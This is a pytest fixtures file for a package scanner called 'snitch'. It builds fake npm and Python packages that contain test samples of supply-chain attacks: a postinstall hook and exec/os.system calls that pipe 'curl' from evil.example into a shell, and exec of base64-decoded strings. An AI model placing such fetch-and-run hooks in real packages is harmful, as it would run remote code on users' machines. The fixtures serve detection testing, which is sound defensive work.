"""Shared fixtures."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from snitch.core.cache import Cache


@pytest.fixture
def cache(tmp_path: Path) -> Cache:
    return Cache(tmp_path / "snitch.db")


@pytest.fixture
def npm_pkg_dir(tmp_path: Path) -> Path:
    """A tiny npm package on disk with a postinstall script & suspicious code."""
    pkg = tmp_path / "node_modules" / "evil"
    pkg.mkdir(parents=True)
    manifest = {
        "name": "evil",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl https://evil.example/x | sh",
        },
        "bin": {"evil": "./cli.js"},
        "main": "index.js",
    }
    (pkg / "package.json").write_text(json.dumps(manifest))
    (pkg / "index.js").write_text(
        "const cp = require('child_process');\n"
        "cp.exec('curl http://evil.example/payload | bash');\n"
        "eval('console.log(1)');\n"
    )
    (pkg / "cli.js").write_text("#!/usr/bin/env node\nconsole.log('hi');\n")
    return pkg


@pytest.fixture
def pip_pkg_dir(tmp_path: Path) -> Path:
    """A tiny on-disk Python package with a malicious setup.py."""
    pkg = tmp_path / "site-packages" / "evilpy"
    pkg.mkdir(parents=True)
    (pkg / "__init__.py").write_text(
        "import base64, os\n"
        "exec(base64.b64decode(b'aW1wb3J0IG9z'))\n"
        "os.system('curl http://evil.example | bash')\n"
    )
    (pkg.parent / "setup.py").write_text(
        "import base64\n"
        "exec(base64.b64decode('cHJpbnQoMSk='))\n"
    )
    return pkg
